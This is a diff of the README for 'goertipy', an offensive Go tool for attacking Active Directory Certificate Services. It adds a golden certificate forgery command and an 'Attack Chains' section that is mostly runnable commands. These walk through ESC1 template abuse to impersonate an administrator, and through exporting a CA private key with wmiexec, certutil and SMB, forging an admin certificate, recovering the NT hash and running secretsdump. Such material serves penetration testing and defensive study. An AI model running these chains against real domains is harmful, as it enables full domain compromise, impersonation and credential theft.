@@ -8,12 +8,14 @@ An Active Directory Certificate Services (AD CS) enumeration and exploitation to
 
 ## Features
 
-- **AD CS Enumeration** — Discovers Certificate Authorities, certificate templates, and their configurations
-- **Vulnerability Detection** — Identifies ESC1–ESC4, ESC6–ESC9, ESC13, ESC15
+- **AD CS Enumeration** — Discover CAs, certificate templates, and detect ESC1–ESC4, ESC6–ESC9, ESC13, ESC15
 - **Certificate Enrollment** — Request certs via RPC (ICertPassage), HTTP/HTTPS (certsrv), or SMB named pipe
-- **PKINIT Authentication** — Authenticate with certificates and recover NT hashes (UnPAC-the-Hash)
+- **PKINIT Authentication** — Authenticate with certificates, recover NT hashes (UnPAC-the-Hash)
+- **Certificate Inspection** — Inspect PFX/PEM certificates locally (subject, EKUs, SANs, key size)
+- **CA Backup** — Fetch CA public certificate from LDAP
+- **Golden Certificate Forgery** — Forge certs as any user using a stolen CA private key
 - **Security Descriptor Parsing** — Full Windows ACL/ACE/SID parsing with permission analysis
-- **NTLM Hash Authentication** — Pass-the-hash support via `--hashes LM:NT`
+- **Pass-the-Hash** — NTLM hash authentication on all commands via `--hashes LM:NT`
 - **Library-First Design** — All functionality available as importable Go packages
 
 ## Installation
@@ -29,6 +31,17 @@ git clone https://github.com/slacker/goertipy.git
 cd goertipy
 go build -o goertipy ./cmd/goertipy
 ```
+
+## Commands
+
+| Command | Description |
+|---------|-------------|
+| `find` | Enumerate CAs and templates, detect ESC vulnerabilities |
+| `req` | Request certificates (RPC / pipe / HTTP) |
+| `auth` | PKINIT authentication → TGT + NT hash |
+| `cert show` | Inspect PFX/PEM certificate details |
+| `ca backup` | Backup CA public certificate from LDAP |
+| `forge` | Golden certificate forgery |
 
 ## Usage
 
@@ -87,8 +100,6 @@ goertipy req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' \
 
 # Retrieve a pending certificate (works with all transports)
 goertipy req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' --retrieve 42
-goertipy req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' --retrieve 42 --pipe
-goertipy req -u user@corp.local --web http://ca.corp.local --ca 'corp-CA' --retrieve 42
 ```
 
 | Flag | Short | Description |
@@ -145,7 +156,7 @@ goertipy auth -u admin@corp.local --dc-ip 10.0.0.1 --pfx-base64 "MIIJ..."
 
 ---
 
-### Cert (Certificate Utilities)
+### Cert (Certificate Inspection)
 
 ```bash
 # Inspect a PFX certificate
@@ -157,6 +168,12 @@ goertipy cert show encrypted.pfx --pfx-pass mypassword
 # Inspect a PEM certificate
 goertipy cert show ca-cert.pem
 ```
+
+Displays: Subject, Issuer, Serial, Validity, Signature Algorithm, Public Key (algorithm + size), Key Usage, Extended Key Usages, SANs, and CA chain.
+
+| Flag | Short | Description |
+|------|-------|-------------|
+| `--pfx-pass` | | PFX password |
 
 ---
 
@@ -186,19 +203,75 @@ goertipy ca backup --ca 'corp-CA' -u administrator -d corp.local --dc-ip 10.0.0.
 
 ---
 
-### ESC1 Full Chain Example
+### Forge (Golden Certificate)
+
+Forge a certificate as any user using a stolen CA private key. The forged cert can be used with `goertipy auth` for PKINIT authentication.
+
+```bash
+# Forge a cert as administrator using stolen CA PFX
+goertipy forge --ca-pfx stolen-ca.pfx --ca-pfx-pass BackupPassword --upn administrator@corp.local
+
+# Using PEM cert + key pair
+goertipy forge --ca-cert ca.pem --ca-key ca.key --upn administrator@corp.local
+
+# Custom validity and output
+goertipy forge --ca-pfx ca.pfx --upn admin@corp.local --validity 30 -o golden.pfx
+```
+
+| Flag | Short | Description |
+|------|-------|-------------|
+| `--ca-pfx` | | CA certificate + key as PFX file |
+| `--ca-pfx-pass` | | PFX password |
+| `--ca-cert` | | CA certificate (PEM) |
+| `--ca-key` | | CA private key (PEM) |
+| `--upn` | | UPN SAN for forged cert |
+| `--dns` | | DNS SAN for forged cert |
+| `--subject` | | Subject CN (default: derived from UPN) |
+| `--serial` | | Serial number (default: random) |
+| `--validity` | | Validity in days (default: 365) |
+| `--key-size` | | RSA key size (default: 2048) |
+| `--output` | `-o` | Output PFX filename |
+
+---
+
+## Attack Chains
+
+### ESC1 — Enrollee Supplies Subject
 
 ```bash
 # 1. Find vulnerable templates
 goertipy find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable
 
-# 2. Request cert with admin UPN (via any transport)
+# 2. Request cert with admin UPN
 goertipy req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' \
   --template VulnTemplate --upn administrator@corp.local
 
 # 3. Authenticate and recover NT hash
 goertipy auth -u administrator@corp.local --dc-ip 10.0.0.1 \
   --pfx corp-CA_VulnTemplate.pfx
+```
+
+### Golden Certificate — Full Chain
+
+```bash
+# 1. Export CA private key on the CA server (requires DA)
+wmiexec.py 'domain/admin:password@CA-IP' 'certutil -p BackupPass -backupKey C:\Windows\Temp\cakey'
+
+# 2. Download the PFX via SMB
+smbclient.py 'domain/admin:password@CA-IP'
+# > use C$
+# > cd Windows/Temp/cakey
+# > get CA-Name.p12
+
+# 3. Forge a golden cert
+goertipy forge --ca-pfx CA-Name.p12 --ca-pfx-pass BackupPass --upn administrator@corp.local
+
+# 4. Authenticate → TGT + NT hash
+goertipy auth -u administrator@corp.local --dc-ip 10.0.0.1 \
+  --pfx forged_administrator_corp.local.pfx
+
+# 5. Use the NT hash
+secretsdump.py -hashes :NT_HASH corp.local/administrator@10.0.0.1
 ```
 
 ## Transport Options
@@ -229,7 +302,8 @@ goertipy auth -u administrator@corp.local --dc-ip 10.0.0.1 \
 ```
 goertipy/
 ├── cmd/goertipy/         # CLI entry point
-├── internal/commands/    # Cobra command definitions (find, req, auth)
+├── docs/                 # Deep dive documentation with protocol diagrams
+├── internal/commands/    # Cobra command definitions (find, req, auth, cert, ca, forge)
 └── pkg/
     ├── adcs/             # AD CS enrollment (RPC, HTTP, pipe), enumeration, vuln detection
     │   └── flags/        # Certificate template and EKU constants
@@ -246,12 +320,19 @@ goertipy/
 go test ./... -v
 ```
 
+## Documentation
+
+See [docs/DEEP_DIVE.md](docs/DEEP_DIVE.md) for protocol flow diagrams and technical internals of every command.
+
 ## References
 
 - [Certified Pre-Owned (SpecterOps)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
 - [Certipy](https://github.com/ly4k/Certipy)
 - [ESC13 — Issuance Policy Abuse](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53)
 - [Microsoft AD CS Documentation](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/)
+- [MS-ICPR — ICertPassage Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-icpr/)
+- [MS-WCCE — Certificate Enrollment Web Service](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/)
+- [RFC 4556 — PKINIT](https://www.rfc-editor.org/rfc/rfc4556)
 
 ## Acknowledgements
 
